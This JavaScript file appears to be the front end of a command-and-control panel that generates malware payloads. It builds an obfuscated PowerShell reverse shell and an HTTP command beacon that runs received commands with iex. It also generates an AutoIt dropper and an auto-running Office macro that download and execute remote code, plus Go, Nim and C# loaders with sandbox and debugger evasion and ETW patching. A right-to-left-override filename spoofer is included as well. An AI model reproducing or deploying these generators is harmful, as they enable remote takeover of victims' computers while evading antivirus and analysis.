function change_password_send() {
    let old_password = document.getElementById('old_password').value;
    let new_password = document.getElementById('new_password').value;
    const xhttp = new XMLHttpRequest();

    xhttp.open("POST", "/profile", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send(`new_password=${new_password}&old_password=${old_password}`);

    xhttp.onload = function () {
        if (this.responseText == "done") {
            document.getElementById("change_password_status").style.display = ""
            document.getElementById("change_password_message").innerHTML = "The password has been changed"

        }
    }
}

function add_session(username) {
    let id = prompt("New session number");
    if (id == "" || id === undefined || id === null) {
        return
    }
    fetch('/apis/add_session?username=' + username + '&id=' + id)

}

function delete_session(username) {
    let id = prompt("delete session number");
    if (id == "" || id === undefined || id === null) {
        return
    }
    fetch('/apis/delete_session?username=' + username + '&id=' + id)

}

function change_username(username) {
    let new_username = prompt("New username");
    if (new_username == "" || new_username === undefined || new_username === null) {
        return
    }
    fetch('/apis/change_username?username=' + username + '&new_username=' + new_username)

}

function change_role(username, role) {
    const isExecuted = confirm("Are you sure to change " + username + " role?");
    if (!isExecuted) return;
    fetch('/apis/change_role?username=' + username + '&role=' + role)


}

function delete_user(username) {
    const isExecuted = confirm("Are you sure delete " + username + " ?");
    if (!isExecuted) return;
    fetch('/apis/delete_user?username=' + username)

}

function open_button(id) {
    // let list = ['list_users_div','add_user_div','change_password_form','auto_command_div','open_autoit_div','powershell_div']
    // let form
    // for(i=0;i<list.length;i++){
    //     form = document.getElementById(list[i])
    //     form.style.display = "none"

    // }


    form = document.getElementById(id);
    if (form.style.display == "block") form.style.display = "none";
    else form.style.display = 'block';
}


function autoit_run() {
    let text = `#include <GUIConstantsEx.au3>
    #include <StaticConstants.au3>
    
    Opt("MouseCoordMode", 2)
    
    Local $child,$CLOSE
    $child = _GUICreate("Hello World!",1,1+1)
    
    Func _GUICreate($title,$width,$height,$left = Default,$top = Default)
        $child = GUICreate($title,$width,$height,$left,$top,0x80000000)
        $CmdPid = Run('C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -Command  "'&"(New-Object System.Net.WebClient).DownloadString('powershell_link') | iex"&'"',@DesktopDir, @SW_SHOW)
    
        _GuiCreateTitleBar("a",0)
    EndFunc
    
    
    
    Func _GuiCreateTitleBar($title,$width)
        GUICtrlCreateLabel($title, 3,3)
        GUICtrlSetColor(-1, 0xffffff)
        GUICtrlSetBkColor(-1, -2)
        $CLOSE = GUICtrlCreateLabel("X", $width - 15,3)
        GUICtrlSetColor(-1, 0xcc0000)
        GUICtrlSetBkColor(-1, -2)
    EndFunc   ;==>_GuiCreateButton
    
    GUISetState()
    
    
    `

    text = text.replace("powershell_link", document.getElementById("powershell_link").value)
    document.getElementById("autoit_textarea_form").innerHTML = text
}
const random_case = (string) => {
    let c
    let return_string = ""
    for (i = 0; i < string.length; i++) {
        c = Math.floor(Math.random() * 2)
        if (c) {
            return_string += string[i].toUpperCase()
        } else {
            return_string += string[i].toLowerCase()

        }

    }
    return return_string

}


function on_connection_command_add_send() {


    const xhttp = new XMLHttpRequest();

    xhttp.open("POST", "/apis/add_on_connection_command", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    const title = document.getElementById("on_connection_command_add_title").value
    const des = document.getElementById("on_connection_command_add_des").value
    const command = document.getElementById("on_connection_command_add_command").value

    xhttp.send(`title=${title}&des=${des}&command=${command}`);

    xhttp.onload = function () {
        if (this.responseText == "done") {
            document.getElementById("on_connection_command_status").style.display = ""
            document.getElementById("on_connection_command_message").innerHTML = "The command was successfully added"

        }
    }


}

function on_connection_command_delete_send() {


    const xhttp = new XMLHttpRequest();

    xhttp.open("POST", "/apis/delete_on_connection_command", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    const id = document.getElementById("on_connection_command_delete_id").value

    xhttp.send(`id=${id}`);

    xhttp.onload = function () {
        if (this.responseText == "done") {
            document.getElementById("on_connection_command_status").style.display = ""
            document.getElementById("on_connection_command_message").innerHTML = "The command was successfully deleted"

        }
    }


}



function auto_command_delete_send() {
    const xhttp = new XMLHttpRequest();
    let form = document.getElementById('auto_command_delete_title');
    const title = document.getElementById('auto_command_delete_title').value;
    xhttp.open("GET", `/apis/delete_auto_command?title=${title}`, true);
    xhttp.send()
    xhttp.onload = function () {
        if (this.responseText == "done") {
            document.getElementById("auto_command_status").style.display = ""
            document.getElementById("auto_command_message").innerHTML = "The command was deleted."

        }
    }
}

function auto_command_send() {

    let title = document.getElementById('auto_command_title').value;
    let des = document.getElementById('auto_command_des').value;
    let command = document.getElementById('auto_command_command').value;

    const xhttp = new XMLHttpRequest();

    xhttp.open("GET", `/apis/add_auto_command?title=${title}&des=${des}&command=${command}`, true);
    xhttp.send()
    xhttp.onload = function () {
        if (this.responseText == "done") {
            document.getElementById("auto_command_status").style.display = ""
            document.getElementById("auto_command_message").innerHTML = "The command was added."

        }
    }

}

function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}

function is_zero() {
    const number = 4
    let num = Math.floor(Math.random() * number)
    if (num == 0) {
        return true
    } else {
        return false
    }
}

function generate_powershell_tcp() {
    const IP = document.getElementById("powershell_ip").value
    const port = document.getElementById("powershell_port").value
    let base =
        `
    $CCCCC = New-Object System.Net.Sockets.TCPClient("127.0.0.1",443)\n
    $SSSSSSS = $CCCCC.GetStream()\n
    [byte[]]$EEEEEEEEEEE = 0..255|%{0}\n
    while(($i = $SSSSSSS.Read($EEEEEEEEEEE, 0, $EEEEEEEEEEE.Length)) -ne 0){\n
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($EEEEEEEEEEE,0, $i)\n
    $sendback = (iex $data 2>&1 | Out-String )\n
    $send2back2  = $sendback + "PS " + (pwd).Path + "> "\n
    $sendbyte = ([text.encoding]::ASCII).GetBytes($send2back2)\n
    $SSSSSSS.Write($sendbyte,0,$sendbyte.Length)\n
    $SSSSSSS.Flush()}\n
    $CCCCC.Close()\n
    `

    base = base.replaceAll("CCCCC", makeid(6))
    base = base.replaceAll("data", makeid(6))
    base = base.replaceAll("SSSSSSS", makeid(6))
    base = base.replaceAll("sendback", makeid(6))
    base = base.replaceAll("sendbyte", makeid(6))
    base = base.replaceAll("send2back2", makeid(6))
    base = base.replaceAll("EEEEEEEEEEE", makeid(6))
    base = base.replaceAll("127.0.0.1", IP)
    base = base.replaceAll("443", port)
    base = base.replaceAll("New-Object", "nEW`-oBj`ECt")
    document.getElementById("powershell_textarea").innerHTML = base
}

function new_object_op() {
    const list = ["nEW-`oB`jECt", "nEW-`oB`jECT", "n`EW-`oB`jECT", "n`EW-`oB`jEC`T", "n`E`W-`oB`jEC`T", "nEW-`OB`jECT", "nEW-`OB`JECT", "N`eW-`OB`JECT"]
    return list[Math.floor(Math.random() * list.length)]
}

function Sleep_start_op() {
    const list = ["Start-S`leep", "Start-S`lEep", "Start-S`lee`P", "Start-S`lE`Ep", "Start-`S`L`E`Ep", "STart-s`l`eEp"]
    return list[Math.floor(Math.random() * list.length)]
}


function generate_powershell_http() {
    let base =
        `
    function get_command {
        
        $req11111 = Invoke-WebRequest "http://localhost:8080/getcommand/get1234" -Headers @{"Authorization"="id_value_change_here"}  
        return $req11111.Content 
    }
    function run_command([string]$command_here){
        $command_here  =(iex $command_here 2>&1 | Out-String )
        return $command_here
    }
    function post_response([string]$command_here){
    

        $postParams = @{rfile=$command_here}
        $req = Invoke-WebRequest "http://localhost:8080/response/post1234" -Headers @{"Authorization"="id_value_change_here"}  -Body $postParams 
    }
    $varrrrr = 1
    
    while ($varrrrr -le 5 -and $varrrrr -ne 3)
    {
        $command_here = get_command
        if($command_here.Trim() -eq "none"){
        Start-Sleep -s time_sleep
    
        }
        else{
        $command_here = run_command($command_here)
        post_response($command_here)
    
        }
        
        Start-Sleep -s time_sleep
    }
    `
    let IP = document.getElementById("powershell_ip").value
    let time_sleep = document.getElementById("time_sleep").value

    // check if there is slash in the end
    if (IP.substr(IP.length - 1) != "/") {
        IP = IP + "/"
    }
    base = base.replaceAll("http://localhost:8080/", IP)
    base = base.replaceAll("time_sleep", time_sleep)

    base = base.replaceAll("get_command", makeid(6))
    base = base.replaceAll("post_response", makeid(6))
    base = base.replaceAll("run_command", makeid(6))
    base = base.replaceAll("download2", makeid(6))
    base = base.replaceAll("session2321", makeid(6))
    base = base.replaceAll("req11111", makeid(6))
    base = base.replaceAll("id1234", makeid(6))
    base = base.replaceAll("file1234", makeid(6))
    base = base.replaceAll("cookie1234", makeid(6))
    base = base.replaceAll("get1234", makeid(6))
    base = base.replaceAll("post1234", makeid(6))

    base = base.replaceAll("postParams", makeid(6))
    base = base.replaceAll("rfile", makeid(6))
    base = base.replaceAll("command_here", makeid(6))
    base = base.replaceAll("varrrrr", makeid(6))
    base = base.replaceAll("bytess", makeid(6))
    base = base.replaceAll("upload2", makeid(6))
    base = base.replaceAll("file_path_base64", makeid(6))
    base = base.replaceAll("textt", makeid(6))

    base = base.replaceAll("nEW-oBjECt", new_object_op())
    base = base.replaceAll("Start-Sleep", Sleep_start_op())
    base = base.replaceAll("Tobase64String", random_case("Tobase64String"))
    base = base.replaceAll("convert", random_case("convert"))
    base = base.replaceAll("Length", random_case("Length"))
    base = base.replaceAll("Substring", random_case("Substring"))
    base = base.replaceAll("Remove", random_case("Remove"))
    base = base.replaceAll("function", random_case("function"))
    base = base.replaceAll("System.Net.Cookie", random_case("System.Net.Cookie"))
    base = base.replaceAll("WebSession", random_case("WebSession"))
    base = base.replaceAll("Invoke-WebRequest", random_case("Invoke-WebRequest"))
    base = base.replaceAll("WriteAllBytes", random_case("WriteAllBytes"))
    base = base.replaceAll("Get-Location", random_case("Get-Location"))
    base = base.replaceAll("else", random_case("else"))
    base = base.replaceAll("return", random_case("return"))

    base = base.replaceAll(".Content", random_case(".Content"))
    base = base.replaceAll("-le", random_case("-le"))
    base = base.replaceAll("-and", random_case("-and"))
    base = base.replaceAll("-ne", random_case("-ne"))
    base = base.replaceAll("-eq", random_case("-eq"))

    base = base.replaceAll("while", random_case("while"))
    base = base.replaceAll("IO.File", random_case("IO.File"))
    base = base.replaceAll("Cookies.Add", random_case("Cookies.Add"))
    base = base.replaceAll("FromBase64String", random_case("FromBase64String"))
    base = base.replaceAll("System.Net.Cookie ", random_case("System.Net.Cookie "))


    base = base.replaceAll("-path", random_case("-path"))
    base = base.replaceAll("Get-Content", random_case("Get-Content"))
    base = base.replaceAll("-Encoding", random_case("-Encoding"))
    base = base.replaceAll("Microsoft.PowerShell.Commands.WebRequestSession", random_case("Microsoft.PowerShell.Commands.WebRequestSession"))
    base = base.replaceAll("id_value_change_here", Math.floor(Math.random() * 10000))
    const old_base = base
    const custom_encoder_status = document.getElementById("custom_encoder_powershell_id").checked
    if(custom_encoder_status){
        base = custom_encode(base)

    }
    document.getElementById("powershell_textarea").innerHTML = base

}
const encoder_checkbox = document.getElementById("custom_encoder_powershell_id");

encoder_checkbox.addEventListener("change", function() {
  if (this.checked) {
    // Checkbox is checked
    generate_powershell_http()
    // Perform some action
  }else{
    generate_powershell_http()
  }
});
function powershell_template(IP,time_sleep){
    
    let base =
        `
    function get_command {
        
        $req11111 = Invoke-WebRequest "http://localhost:8080/getcommand/get1234" -Headers @{"Authorization"="id_value_change_here"}  
        return $req11111.Content 
    }
    function run_command([string]$command_here){
        $command_here  =(iex $command_here 2>&1 | Out-String )
        return $command_here
    }
    function post_response([string]$command_here){
    

        $postParams = @{rfile=$command_here}
        $req = Invoke-WebRequest "http://localhost:8080/response/post1234" -Headers @{"Authorization"="id_value_change_here"}  -Body $postParams 
    }
    $varrrrr = 1
    
    while ($varrrrr -le 5 -and $varrrrr -ne 3)
    {
        $command_here = get_command
        if($command_here.Trim() -eq "none"){
        Start-Sleep -s time_sleep
    
        }
        else{
        $command_here = run_command($command_here)
        post_response($command_here)
    
        }
        
        Start-Sleep -s time_sleep
    }
    `
    if (IP.substr(IP.length - 1) != "/") {
        IP = IP + "/"
    }
    base = base.replaceAll("http://localhost:8080/", IP)
    base = base.replaceAll("time_sleep", time_sleep)

    base = base.replaceAll("get_command", makeid(6))
    base = base.replaceAll("post_response", makeid(6))
    base = base.replaceAll("run_command", makeid(6))
    base = base.replaceAll("download2", makeid(6))
    base = base.replaceAll("session2321", makeid(6))
    base = base.replaceAll("req11111", makeid(6))
    base = base.replaceAll("id1234", makeid(6))
    base = base.replaceAll("file1234", makeid(6))
    base = base.replaceAll("cookie1234", makeid(6))
    base = base.replaceAll("get1234", makeid(6))
    base = base.replaceAll("post1234", makeid(6))

    base = base.replaceAll("postParams", makeid(6))
    base = base.replaceAll("rfile", makeid(6))
    base = base.replaceAll("command_here", makeid(6))
    base = base.replaceAll("varrrrr", makeid(6))
    base = base.replaceAll("bytess", makeid(6))
    base = base.replaceAll("upload2", makeid(6))
    base = base.replaceAll("file_path_base64", makeid(6))
    base = base.replaceAll("textt", makeid(6))

    base = base.replaceAll("nEW-oBjECt", new_object_op())
    base = base.replaceAll("Start-Sleep", Sleep_start_op())
    base = base.replaceAll("Tobase64String", random_case("Tobase64String"))
    base = base.replaceAll("convert", random_case("convert"))
    base = base.replaceAll("Length", random_case("Length"))
    base = base.replaceAll("Substring", random_case("Substring"))
    base = base.replaceAll("Remove", random_case("Remove"))
    base = base.replaceAll("function", random_case("function"))
    base = base.replaceAll("System.Net.Cookie", random_case("System.Net.Cookie"))
    base = base.replaceAll("WebSession", random_case("WebSession"))
    base = base.replaceAll("Invoke-WebRequest", random_case("Invoke-WebRequest"))
    base = base.replaceAll("WriteAllBytes", random_case("WriteAllBytes"))
    base = base.replaceAll("Get-Location", random_case("Get-Location"))
    base = base.replaceAll("else", random_case("else"))
    base = base.replaceAll("return", random_case("return"))

    base = base.replaceAll(".Content", random_case(".Content"))
    base = base.replaceAll("-le", random_case("-le"))
    base = base.replaceAll("-and", random_case("-and"))
    base = base.replaceAll("-ne", random_case("-ne"))
    base = base.replaceAll("-eq", random_case("-eq"))

    base = base.replaceAll("while", random_case("while"))
    base = base.replaceAll("IO.File", random_case("IO.File"))
    base = base.replaceAll("Cookies.Add", random_case("Cookies.Add"))
    base = base.replaceAll("FromBase64String", random_case("FromBase64String"))
    base = base.replaceAll("System.Net.Cookie ", random_case("System.Net.Cookie "))


    base = base.replaceAll("-path", random_case("-path"))
    base = base.replaceAll("Get-Content", random_case("Get-Content"))
    base = base.replaceAll("-Encoding", random_case("-Encoding"))
    base = base.replaceAll("Microsoft.PowerShell.Commands.WebRequestSession", random_case("Microsoft.PowerShell.Commands.WebRequestSession"))
    base = base.replaceAll("id_value_change_here", Math.floor(Math.random() * 10000))
    return base
}


function change_powershell_type() {
    const type = document.getElementById("powershell_type").value
    if (type == "http") {
        document.getElementById("powershell_port").style.display = "none"
        return
    }
    document.getElementById("powershell_port").style.display = ""

}

function generate_powershell() {
    // const type = document.getElementById("powershell_type").value
    // if(type == "basic"){
    // generate_powershell_http_basic()
    // }else{
    generate_powershell_http()
    // }

}


function add_user_send() {
    let username = document.getElementById('add_user_username').value;
    let password = document.getElementById('add_user_passowrd').value;
    const xhttp = new XMLHttpRequest();

    xhttp.open("POST", "/apis/add_user", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send(`username=${username}&password=${password}`);

    xhttp.onload = function () {
        if (this.responseText == "done") {
            document.getElementById("add_user_div_status").style.display = ""
            document.getElementById("add_user_message").innerHTML = "User added successfully"

        }
        if (this.responseText == "user already exists") {
            document.getElementById("add_user_div_status").style.display = ""
            document.getElementById("add_user_message").innerHTML = "user already exists"

        }
    }
}

function macro_button() {
    let macro = ` 
    Sub calc()
                                    Dim Memcheck As Boolean
                                    Dim space_check As Boolean
                                    
                                    Memcheck = SysMemory
                                    space_check = ShowSpaceInfo
                                    
                                    If Memcheck = True And space_check = True Then
                                    Shell (Replace("##p#o#w###e#r#s##h#e#l###l#.#e####x###e### (N#e#w#-#O#b#j#e#c##t ##Sy##s##t##em.##N##e##t##.W##e##bC##l##ie##nt##).D##o##wn##l##o##a##d##F##il##e####('exe_url', '#C##:#\\#T#e#m#p#\\#u#p#d#a#t#e#.#e##x##e##')", "#", ""))
                                    sleep
                                    sleep
                                    Shell (Replace("#C#:#\\#t#e#m#p#\\#u#p#d#a#t#e#.#e#x#e#", "#", ""))
                                    Else
                                    End If
                                    End Sub
                                    
                                    Sub Auto_Open()
                                    
                                    calc
                                    
                                    End Sub
                                    
                                    Sub Workbook_Open()
                                    
                                    calc
                                    
                                    End Sub
                                    
                                    
                                    Sub document_open()
                                      calc
                                    End Sub
                                    
                                    Sub sleep()
                                    For i = 0 To 400000000
                                          i = i
                                    Next
                                    End Sub
                                    
                                    Function SysMemory()
                                        Dim oInstance
                                        Dim colInstances
                                        Dim dRam                  As Double
                                        Set colInstances = GetObject("winmgmts:").ExecQuery("SELECT * FROM Win32_PhysicalMemory")
                                        For Each oInstance In colInstances
                                            dRam = dRam + oInstance.Capacity
                                        Next
                                        SysMemory = dRam / 1024 / 1024
                                        If SysMemory > 4000 Then
                                        SysMemory = True
                                        Else
                                        SysMemory = False
                                        End If
                                    End Function
                                    
                                    Function ShowSpaceInfo()
                                        Dim fs, d, s
                                        
                                        Set fs = CreateObject("Scripting.FileSystemObject")
                                        Set d = fs.GetDrive(fs.GetDriveName(fs.GetAbsolutePathName("C:\\")))
                                        s = s & FormatNumber(d.TotalSize / 1024 / 1024 / 1024, 0)
                                        s = s & vbCrLf
                                        If s > 100 Then
                                        ShowSpaceInfo = True
                                        Else
                                        ShowSpaceInfo = False
                                        End If
                                        
                                    End Function`
    let text = document.getElementById('marco_textarea')
    text.style.display = "block"

    macro = macro.replaceAll("Memcheck", makeid(12))
    macro = macro.replaceAll("colInstances", makeid(12))
    macro = macro.replaceAll("oInstance", makeid(12))
    macro = macro.replaceAll("calc", makeid(12))
    macro = macro.replaceAll("ShowSpaceInfo", makeid(12))
    macro = macro.replaceAll("SysMemory", makeid(12))
    macro = macro.replaceAll("dRam", makeid(12))
    macro = macro.replaceAll("space_check", makeid(12))
    let list = ["诶", "必", "衣", "挨", "饿罗", "开", "дэ", "вэ", "ш", "гк", "Ѫ", "Ф", "Ё", "Д"]
    macro = macro.replaceAll("space_check", makeid(12))
    macro = macro.replaceAll("space_check", makeid(12))
    let comment = list[Math.floor(Math.random() * list.length)] + list[Math.floor(Math.random() * list.length)]
    macro = macro.replaceAll("#", comment)
    let url = document.getElementById('macro_url').value
    let new_url = ""
    for (i = 0; i < url.length; i++) {
        new_url = new_url + url[i] + comment
    }
    let output = macro.replace("exe_url", new_url)

    text.innerHTML = output

}


const go_replace = (string)=>{
    let replace = add_random_for_replace(string)
    string = `strings.Replace("${replace.string}","${replace.char}","",-1)`
    return string
}

function go_generate() {

    let base = `
package main

import (
    "net/http"
	"os"
    "os/exec"
	"time"
    "strings"
)

func Size1234() {
    _, err := http.Get("random_url_here")
if err != nil {
    os.Exit(0)
}
}
func sleep1234(){
	start1234 := time.Now()
	time.Sleep(random_sleep_number * time.Second)
	elapsed1234 := time.Since(start1234)
	if(elapsed1234 < random_sleep_number){
		os.Exit(0)
	}

}
func main() {
    Size1234()
    sleep1234()
    cmd1234 := exec.Command(powershell_here,nologo, noprofile,command_here,"iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('powershell_encoded')))")	 

	cmd1234.Run()
}
`
let time = document.getElementById('go_time').value 

    let url = document.getElementById('go_url').value 
     // check if there is slash in the end
     if (url.substr(url.length - 1) != "/") {
        url = url + "/"
    }
    let random_url = document.getElementById('go_random_url').value

    if(random_url == ""){
        base = base.replaceAll("random_url_here","https://google.com/")
    }else{
        base = base.replaceAll("random_url_here",random_url)

    }
    base = base.replaceAll("powershell_encoded",btoa(powershell_template(url,time)))
    base = base.replaceAll("Size1234",makeid(6))
    base = base.replaceAll("sleep1234",makeid(6))
    base = base.replaceAll("start1234",makeid(6))
    base = base.replaceAll("random_sleep_number",Math.floor(Math.random() * 10))
    base = base.replaceAll("elapsed1234",makeid(6))

    base = base.replaceAll("http://localhost:8080/",url)
    base = base.replaceAll("out1234",makeid(6))
    base = base.replaceAll("client1234",makeid(6))
    base = base.replaceAll("req1234",makeid(6))
    base = base.replaceAll("r1234",makeid(6))
    base = base.replaceAll("rfile",makeid(6))

    base = base.replaceAll("response1234",makeid(6))
    base = base.replaceAll("get1234",makeid(6))
    base = base.replaceAll("res1234",makeid(6))
    base = base.replaceAll("cmd1234",makeid(6))
    base = base.replaceAll("send_response",makeid(6))
    base = base.replaceAll("resBody",makeid(6))
    base = base.replaceAll("get_command",makeid(6))
    base = base.replaceAll("id_here",Math.floor(Math.random() * 10000))
    base = base.replaceAll("powershell_here",go_replace("powershell"))
    base = base.replaceAll("noprofile",go_replace("-noprofile"))
    base = base.replaceAll("nologo",go_replace("-nologo"))
    base = base.replaceAll("command_here",go_replace("-command"))

    document.getElementById("go_textarea").innerHTML = base
}
const add_random_for_replace = (string)=>{
    let return_str = ""
    const list = ["Б","Г","Д","Ё","Ж","П","Я","Щ"]
    const number = Math.floor(Math.random() * list.length)
    for(i=0;i<string.length;i++){
        return_str += string[i] + list[number]
    }
    return {string:return_str,char:list[number]}
}

const nim_replace = (string)=>{
    let replace = add_random_for_replace(string)
    string = `"${replace.string}".replace("${replace.char}","")`
    return string
}


function nim_generate(){

    base = `
import std/[times, os]
import std/httpclient
import osproc
import std/strutils
import winim/lean
import strformat
import dynlib
    
when defined amd64:
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
proc sleep1(): void = 
  let time1234 = cpuTime()
  sleep(3000) 

  if(cpuTime() - time1234<3):
     quit()
  discard

proc cores(): void =
  if countProcessors() < 4:
    quit()

proc send_request(): void= 
  var client1234 = newHttpClient()
  var c1234 = client1234.getContent("https://google.com")

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    var success = Patchntdll()
    sleep1()
    cores()
    send_request()
    var powershell1234 = powershell_replace
    var noprofile1234 = noprofile_replace
    var nologo1234 = nologo_replace
    let errC = execCmd("$# $# $# -c iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('powershell_encoded')))" % [powershell1234,noprofile1234,nologo1234])
    
    `
    let time = document.getElementById('nim_time').value 

    let url = document.getElementById('nim_url').value 
     // check if there is slash in the end
     if (url.substr(url.length - 1) != "/") {
        url = url + "/"
    }
    let random_url = document.getElementById('nim_random_url').value

    if(random_url == ""){
        base = base.replaceAll("random_url_here","https://google.com/")
    }else{
        base = base.replaceAll("random_url_here",random_url)

    }
    base = base.replaceAll("cores",makeid(6))
    base = base.replaceAll("send_request",makeid(6))
    base = base.replaceAll("sleep1",makeid(6))
    base = base.replaceAll("errC",makeid(6))
    base = base.replaceAll("client1234",makeid(6))
    base = base.replaceAll("time1234",makeid(6))
    base = base.replaceAll("powershell1234",makeid(6))
    base = base.replaceAll("noprofile1234",makeid(6))
    base = base.replaceAll("nologo1234",makeid(6))
    base = base.replaceAll("c1234",makeid(6))

    base = base.replaceAll("powershell_encoded",btoa(powershell_template(url,time)))
    base = base.replaceAll("powershell_replace",nim_replace("powershell"));
    base = base.replaceAll("noprofile_replace",nim_replace("-noprofile"));
    base = base.replaceAll("nologo_replace",nim_replace("-nologo"));

    document.getElementById("nim_textarea").innerHTML = base

}

const csharp_replace = (string)=>{
    let replace = add_random_for_replace(string)
    string = `"${replace.string}".Replace("${replace.char}","")`
    return string
}


function c_sharp_generate(){
    base = `
    using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Diagnostics.Tracing.Parsers.Clr;
using System.Security;
namespace Anti_everything
{

    class Program
    {


       
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        static void Main(string[] args)
        {
            IntPtr hide_window = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(hide_window, 0);
            bypass_sanbox_RAM();
            bypass_sandbox_CORES();
            bypass_sandbox_network();
            bypass_sandbox_drive();
            sleep();
            detect_debuger();
            SetProcessSecurityDescriptor();
            StartGame();
        }
        


        static void StartGame()
        {
            string powershell1234 = powershell_here;
            string noprofile1234 = noprofile_here;
            string nologo1234 = nologo_here;
            System.Diagnostics.Process.Start(powershell1234, $"{noprofile1234} {nologo1234} -c iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('powershell_encoded')))");
        }

        static void detect_debuger() {
            if (System.Diagnostics.Debugger.IsAttached)
            {
                System.Environment.Exit(2);
                
            }
        }
        static void sleep() {
            var watch1234 = System.Diagnostics.Stopwatch.StartNew();
            Thread.Sleep(2000);
            watch1234.Stop();
            var elapsedMs = watch1234.ElapsedMilliseconds;
            if (elapsedMs < 2000) {
                System.Environment.Exit(2);
            }
        }




        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);

        static void bypass_sanbox_RAM()
        {
            long memKb;
            GetPhysicallyInstalledSystemMemory(out memKb);
            if ((memKb / 1024 / 1024) < 4) {
                System.Environment.Exit(2);
            }
        }

        static void bypass_sandbox_CORES() {
            if (3 > Environment.ProcessorCount) {
                System.Environment.Exit(2);
            };
            
        }

        static void bypass_sandbox_network() {
            HttpWebRequest httpReq = (HttpWebRequest)WebRequest.Create("random_url");
            httpReq.AllowAutoRedirect = false;
            HttpWebResponse httpRes = (HttpWebResponse)httpReq.GetResponse();

        }

        static void bypass_sandbox_drive()
        {
            DriveInfo dDrive = new DriveInfo("C");
            if (dDrive.IsReady)
            {

                if(dDrive.TotalSize< 100000000000) 
                {
                    System.Environment.Exit(2);

                }
            }
        }

        public static void SetProcessSecurityDescriptor()
        {
           string sddl ="D:P(D;;GA;;;WD)";  
              
            IntPtr securityDescriptor = IntPtr.Zero;
    
            if (!ConvertStringSecurityDescriptorToSecurityDescriptor(sddl, 1, out securityDescriptor, IntPtr.Zero))
            {
                return;
            }
    
            if (!SetKernelObjectSecurity(GetCurrentProcess(), 0x4, securityDescriptor))
            {
            }
    
            LocalFree(securityDescriptor);
        }
    
        [DllImport("advapi32.dll", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        private static extern bool ConvertStringSecurityDescriptorToSecurityDescriptor(
            string StringSecurityDescriptor,
            int StringSDRevision,
            out IntPtr SecurityDescriptor,
            IntPtr SecurityDescriptorSize
        );
    
        [DllImport("advapi32.dll", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        private static extern bool SetKernelObjectSecurity(
            IntPtr Handle,
            int SecurityInformation,
            IntPtr SecurityDescriptor
        );
    
        [DllImport("kernel32.dll", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        private static extern IntPtr GetCurrentProcess();
    
        [DllImport("kernel32.dll", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        private static extern IntPtr LocalFree(
            IntPtr hMem
        );




}
}
`
let url = document.getElementById("csharp_url").value
let time = document.getElementById("csharp_time").value
let random_url = document.getElementById("csharp_random_url").value
base = base.replaceAll("Anti_everything",makeid(6))
base = base.replaceAll("SetProcessSecurityDescriptor",makeid(6))
base = base.replaceAll("noprofile1234",makeid(6))

base = base.replaceAll("Program",makeid(6))
base = base.replaceAll("StartGame",makeid(6))
base = base.replaceAll("bypass_sandbox_drive",makeid(6))
base = base.replaceAll("dDrive",makeid(6))
base = base.replaceAll("httpReq",makeid(6))
base = base.replaceAll("bypass_sandbox_network",makeid(6))
base = base.replaceAll("bypass_sandbox_CORES",makeid(6))
base = base.replaceAll("bypass_sanbox_RAM",makeid(6))
base = base.replaceAll("memKb",makeid(6))
base = base.replaceAll("watch1234",makeid(6))
base = base.replaceAll("elapsedMs",makeid(6))
base = base.replaceAll("detect_debuger",makeid(6))
base = base.replaceAll("hide_window",makeid(6))
base = base.replaceAll("sleep",makeid(6))
base = base.replaceAll("random_url",random_url)
base = base.replaceAll("powershell1234",makeid(6))
base = base.replaceAll("nologo1234",makeid(6))

base = base.replaceAll("powershell_here",csharp_replace("powershell.exe"))
base = base.replaceAll("nologo_here",csharp_replace("-nologo"))
base = base.replaceAll("noprofile_here",csharp_replace("-noprofile"))


base = base.replaceAll("powershell_encoded",btoa(powershell_template(url,time)))

document.getElementById("csharp_textarea").innerHTML = base;

}
const rtlo = ()=>{
    let name = document.getElementById("rtlo_encode_id").value
    let ext = document.getElementById("rtlo_encode_ext_id").value
    name = name.split("").reverse().join("")
    name = `‮${name}`
    document.getElementById("rtlo_encode_result_id").value = name+"."+ext
}

const Ascii_char_handle = (char)=>{
    const zero = '${=}'
    const one = '${+}'
    const two = '${@}'
    const three ='${.}'
    const four = '${[}'
    const five = '${]}'
    const six = '${(}'
    const seven = '${)}'
    const eight = '${&}'
    const nine = '${|}'

    let chars = char.toString().split("")
